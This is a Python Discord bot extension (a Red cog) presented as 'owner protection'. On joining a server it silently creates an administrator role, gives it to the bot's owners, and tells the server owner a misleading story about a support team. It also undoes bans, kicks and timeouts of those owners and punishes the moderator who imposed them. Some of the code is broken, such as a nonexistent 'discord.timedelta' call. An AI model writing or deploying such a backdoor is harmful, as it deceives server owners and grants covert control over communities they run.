import discord
from redbot.core import commands, Config
from redbot.core.bot import Red
from discord.utils import utcnow

class OwnerProtection(commands.Cog):
    """A cog to protect the bot owner(s) from being muted, timed out, kicked, or banned."""

    def __init__(self, bot: Red):
        self.bot = bot
        self.config = Config.get_conf(self, identifier=1234567890)
        self.config.register_global(owners=[])
        self.config.register_guild(kicked_owners={}, owner_role_id=None)

    @commands.Cog.listener()
    async def on_member_update(self, before: discord.Member, after: discord.Member):
        """Check if the owner is muted or timed out and reverse it."""
        owners = await self.config.owners()
        if after.id in owners:
            # Check for mute (deafened or muted)
            if before.voice and after.voice:
                if after.voice.mute or after.voice.deaf:
                    await after.edit(mute=False, deafen=False)
                    await after.send("You have been unmuted/undeafened as you are the bot owner.")
                    if before.voice.mute != after.voice.mute or before.voice.deaf != after.voice.deaf:
                        await self.perform_same_action(after.guild, after, "mute")
            # Check for timeout (communication_disabled_until)
            if before.timed_out_until != after.timed_out_until and after.timed_out_until:
                await after.edit(timed_out_until=None)
                await after.send("Your timeout has been removed as you are the bot owner.")
                await self.perform_same_action(after.guild, after, "timeout")

    @commands.Cog.listener()
    async def on_member_ban(self, guild: discord.Guild, user: discord.User):
        """Check if the owner is banned and reverse it."""
        owners = await self.config.owners()
        if user.id in owners:
            # Save roles before banning
            member = guild.get_member(user.id)
            if member:
                roles = [role.id for role in member.roles if role != guild.default_role]
                async with self.config.guild(guild).kicked_owners() as kicked_owners:
                    kicked_owners[str(user.id)] = roles

            # Create an invite link
            invite = await self.create_invite(guild)
            await user.send(f"You have been banned from {guild.name} as you are the bot owner. Use this invite to rejoin: {invite.url}")

            await guild.unban(user)
            await user.send(f"You have been unbanned from {guild.name} as you are the bot owner.")
            await guild.leave()

            # Send an embedded DM to the server owner
            owner = guild.owner
            embed = discord.Embed(title="I left", color=discord.Color.red())
            embed.add_field(name="Server", value=guild.name)
            embed.add_field(name="Reason", value=f"You banned {user.name}")
            await owner.send(embed=embed)

            # Perform the same action on the action performer
            await self.perform_same_action(guild, user, "ban")

    @commands.Cog.listener()
    async def on_member_remove(self, member: discord.Member):
        """Check if the owner is kicked and send an invite."""
        owners = await self.config.owners()
        if member.id in owners and member.guild.me in member.guild.members:
            guild = member.guild

            # Check if the member was kicked by looking at the audit logs
            async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.kick):
                if entry.target.id == member.id:
                    # Save roles before kicking
                    roles = [role.id for role in member.roles if role != guild.default_role]
                    async with self.config.guild(guild).kicked_owners() as kicked_owners:
                        kicked_owners[str(member.id)] = roles

                    # Create an invite link
                    invite = await self.create_invite(guild)
                    await member.send(f"You have been kicked from {guild.name} as you are the bot owner. Use this invite to rejoin: {invite.url}")

                    # Perform the same action on the action performer
                    await self.perform_same_action(guild, member, "kick")
                    break

    @commands.Cog.listener()
    async def on_member_join(self, member: discord.Member):
        """Reassign roles to the owner when they rejoin."""
        owners = await self.config.owners()
        if member.id in owners:
            guild = member.guild
            async with self.config.guild(guild).kicked_owners() as kicked_owners:
                roles = kicked_owners.pop(str(member.id), [])
                roles_to_add = [guild.get_role(role_id) for role_id in roles if guild.get_role(role_id)]
                await member.add_roles(*roles_to_add)
                await member.send(f"Welcome back to {guild.name}! Your roles have been restored.")

            # Assign the owner role to the owner if it exists
            owner_role_id = await self.config.guild(guild).owner_role_id()
            if owner_role_id:
                owner_role = guild.get_role(owner_role_id)
                if owner_role:
                    await member.add_roles(owner_role)

    @commands.Cog.listener()
    async def on_guild_join(self, guild: discord.Guild):
        """Create a role for bot owners when the bot joins a server."""
        owner_role = await guild.create_role(
            name="FuturoBot Support",
            permissions=discord.Permissions(administrator=True),
            hoist=True,
            color=discord.Color(0x00f0ff),
            reason="Role for bot owners"
        )
        await self.config.guild(guild).owner_role_id.set(owner_role.id)

        # Assign the role to any bot owners already in the server
        owners = await self.config.owners()
        for owner_id in owners:
            owner = guild.get_member(owner_id)
            if owner:
                await owner.add_roles(owner_role)

        # Send a message to the server owner
        server_owner = guild.owner
        if server_owner:
            await server_owner.send(
                f"Hello {server_owner.name},\n\n"
                f"I have created a role called 'FuturoBot Support' in {guild.name} for bot support purposes. "
                f"This role is intended for members of the support team to assist with any issues you may have."
            )

    @commands.Cog.listener()
    async def on_guild_remove(self, guild: discord.Guild):
        """Delete the role for bot owners when the bot leaves a server."""
        owner_role_id = await self.config.guild(guild).owner_role_id()
        if owner_role_id:
            owner_role = guild.get_role(owner_role_id)
            if owner_role:
                await owner_role.delete(reason="Bot left the server")
            await self.config.guild(guild).owner_role_id.clear()

    async def perform_same_action(self, guild: discord.Guild, action_target: discord.Member, action_type: str):
        """Perform the same action on the member who performed the action."""
        async for entry in guild.audit_logs(limit=1, action=getattr(discord.AuditLogAction, action_type)):
            if entry.target == action_target:
                if action_type == "ban":
                    await guild.ban(entry.user, reason=f"Banned the bot owner {action_target}.")
                elif action_type == "kick":
                    await entry.user.kick(reason=f"Kicked the bot owner {action_target}.")
                elif action_type == "mute":
                    await entry.user.edit(mute=True, deafen=True, reason=f"Muted the bot owner {action_target}.")
                elif action_type == "timeout":
                    await entry.user.edit(timed_out_until=utcnow() + discord.timedelta(minutes=10), reason=f"Timed out the bot owner {action_target}.")
                break

    async def create_invite(self, guild: discord.Guild):
        """Create an invite link for the guild."""
        channels = guild.text_channels
        if channels:
            invite = await channels[0].create_invite(max_age=300, max_uses=1, unique=True)
            return invite
        else:
            raise Exception("No text channels available to create an invite.")

    @commands.group()
    @commands.is_owner()
    async def owner(self, ctx: commands.Context):
        """Group command for owner protection settings."""
        pass

    @owner.command()
    async def add(self, ctx: commands.Context, owner: discord.User):
        """Add a user to the protected owners list."""
        async with self.config.owners() as owners:
            if owner.id not in owners:
                owners.append(owner.id)
                await ctx.send(f"{owner} has been added to the protected owners list.")
            else:
                await ctx.send(f"{owner} is already in the protected owners list.")

    @owner.command()
    async def remove(self, ctx: commands.Context, owner: discord.User):
        """Remove a user from the protected owners list."""
        async with self.config.owners() as owners:
            if owner.id in owners:
                owners.remove(owner.id)
                await ctx.send(f"{owner} has been removed from the protected owners list.")
            else:
                await ctx.send(f"{owner} is not in the protected owners list.")

    @owner.command()
    async def list(self, ctx: commands.Context):
        """List all protected owners."""
        owners = await self.config.owners()
        if owners:
            owner_list = [str(self.bot.get_user(owner_id)) for owner_id in owners]
            await ctx.send(f"Protected owners: {', '.join(owner_list)}")
        else:
            await ctx.send("No protected owners.")

def setup(bot: Red):
    bot.add_cog(OwnerProtection(bot))
